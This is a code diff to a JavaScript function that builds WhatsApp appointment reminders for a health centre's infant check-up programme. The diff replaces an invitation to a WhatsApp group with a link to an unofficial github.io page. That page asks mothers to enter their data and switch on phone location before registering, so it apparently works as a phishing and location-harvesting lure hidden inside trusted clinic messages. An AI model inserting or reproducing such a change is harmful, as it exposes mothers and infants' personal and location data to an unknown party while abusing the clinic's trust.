@@ -317,7 +317,7 @@
         const fechaTxt = esHoy ? "*HOY*" : `el *${p['FECHA DE CITA']}*`;
         
         // Mensaje personalizado con el EESS
-        const msg = `Hola, le saludamos de su centro de salud *${p.EESS}*. *${p.NOMBRE}*, se le recuerda que la cita de su control de su bebe es ${fechaTxt} en el turno *${p.TURNO}* en el *${p.CONSULTORIO}*. Por favor, no falte: Invitarle tambien a ser parte del grupo Whatsapp CRED del Centro de Salud, unirse por el link https://chat.whatsapp.com/FELCvT889zo265G8LkVkPY.`;
+        const msg = `Le saludo del Centro de Salud *${p.EESS}*, mamita de *${p.NOMBRE}*, se le recuerda la cita CRED para el ${fechaTxt} en el turno *${p.TURNO}*. Por favor, no falte: Invitarle tambien a nuestro sistema de RECUERDA CITAS CRED, para eso deberá registrar tus datos por el link https://confianzaseguridad772-max.github.io/GeoBoyGirl/, lo mas importe active la ubicación de celular antes de registrarse.`;
         
         return `https://api.whatsapp.com/send?phone=51${p.CELULAR.trim()}&text=${encodeURIComponent(msg)}`;
     }
